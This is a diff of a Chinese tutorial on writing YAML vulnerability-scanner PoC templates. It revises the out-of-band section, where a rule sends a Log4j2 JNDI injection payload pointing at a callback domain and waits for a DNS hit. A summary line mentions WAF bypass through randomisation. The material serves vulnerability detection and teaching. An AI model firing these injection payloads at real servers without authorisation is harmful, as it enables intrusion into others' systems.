@@ -94,20 +94,15 @@ expression: get_session() && exploit() # 按顺序执行
 对于 Log4j2 这种无回显漏洞，我们需要用到 OOB。
 
 ```yaml
-set:
-  oob: oob() # 获取一个反连 URL，例如 http://xxx.ceye.io
-  oobHTTP: oob.HTTP # 获取 HTTP 格式的 URL
-  oobDNS: oob.DNS   # 获取 DNS 格式的域名
-
 rules:
   r0:
     request:
       method: GET
-      path: /?vulnerable_param=${jndi:ldap://{{oobDNS}}} # 发送带有反连域名的 Payload
-    expression: oobCheck(oob, oob.ProtocolDNS, 3) # 检查 3 秒内是否有 DNS 记录
+      path: /?vulnerable_param=${jndi:ldap://{{oob.DNS}}} # 发送带有反连域名的 Payload
+    expression: oobWait(oob, oob.ProtocolDNS, 3) # 检查 3 秒内是否有 DNS 记录
 ```
 
-只要 `oobCheck` 返回 true，说明服务器请求了我们的域名，漏洞存在！
+只要 `oobWait` 返回 true，说明服务器请求了我们的域名，漏洞存在！
 
 ---
 
@@ -116,7 +111,7 @@ rules:
 1.  **随机化**：用 `set` 和 `random` 函数降低误报，绕过 WAF。
 2.  **指纹门控**：用 `requires` 避免无效发包。
 3.  **多步利用**：用 `output` 提取变量，实现登录验证、Token 复用。
-4.  **OOB**：用 `oob()` 和 `oobCheck()` 搞定无回显漏洞。
+4.  **OOB**：用 `{{oob.DNS}}/{{oob.HTTP}}` + `oobWait()` 搞定无回显漏洞。
 
 掌握了这些，你已经能写出市面上 99% 的 PoC 了。
 
